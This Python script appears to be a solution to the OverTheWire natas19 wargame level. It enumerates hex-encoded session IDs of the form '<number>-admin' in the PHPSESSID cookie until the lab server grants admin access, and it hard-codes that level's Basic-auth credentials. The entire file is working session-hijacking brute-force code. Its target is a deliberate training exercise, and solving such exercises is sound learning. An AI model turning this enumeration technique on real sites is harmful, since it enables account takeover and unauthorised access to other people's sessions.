import requests
from requests.auth import HTTPBasicAuth
import binascii

Auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
gotcha = "You are an admin."

for i in range(1, 641):
    if i % 10 == 0:
        print (f'Checked {str(i)} sessions...')
    exploit = { 'PHPSESSID': f"{str(i)}-admin".encode("utf-8").hex() }
    print(exploit)
    response = requests.get('http://natas19.natas.labs.overthewire.org/index.php', auth=Auth, cookies=exploit)
    if gotcha in response.text:
        print(response.text)
        break